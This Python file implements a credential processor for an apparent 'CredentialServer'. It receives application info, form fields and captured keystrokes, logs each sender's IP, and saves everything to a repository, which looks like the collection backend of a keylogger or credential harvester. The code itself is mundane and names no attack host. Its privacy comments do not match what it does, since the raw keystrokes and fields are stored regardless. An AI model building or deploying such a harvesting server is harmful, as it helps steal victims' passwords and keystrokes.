"""credential_processor.py"""

from typing import Dict
import logging
import json
import traceback
from interfaces.credential_processor import ICredentialProcessor
from interfaces.credential_repository import ICredentialRepository

logger = logging.getLogger("CredentialServer")

class CredentialProcessor(ICredentialProcessor):
    """Implementation of ICredentialProcessor"""
    
    def __init__(self, repository: ICredentialRepository):
        """Initialize with credential repository"""
        self.repository = repository
        logger.info(f"Credential processor initialized with repository type: {type(repository).__name__}")
    
    def process_credentials(self, data: Dict, client_ip: str = None) -> Dict:
        """Process the received credential data with optional client IP"""
        try:
            # Log the received data (excluding sensitive info)
            logger.debug(f"Processing credentials data from IP: {client_ip}")
            logger.debug(f"Data keys: {list(data.keys())}")
            
            # Extract application information
            application_info = data.get("ApplicationInfo", {})
            app_name = application_info.get("app_name", "unknown")
            logger.debug(f"Processing credentials for application: {app_name}")
            
            # Extract form fields (mask passwords)
            form_fields = data.get("FormFields", [])
            
            # Extract keystrokes (don't log these for privacy)
            keystrokes = data.get("Keystrokes", [])
            logger.debug(f"Number of keystrokes: {len(keystrokes)}")
            
            # Save to repository with client IP
            logger.debug(f"Saving credentials to repository with client IP: {client_ip}")
            document_id = self.repository.save_credentials(
                application_info,
                form_fields,
                keystrokes,
                client_ip
            )
            logger.debug(f"Repository returned document_id: {document_id}")
            
            return {
                "status": "success",
                "document_id": document_id
            }
            
        except Exception as e:
            logger.error(f"Error processing credentials: {e}")
            logger.error(traceback.format_exc())
            return {
                "status": "error",
                "message": str(e)
            }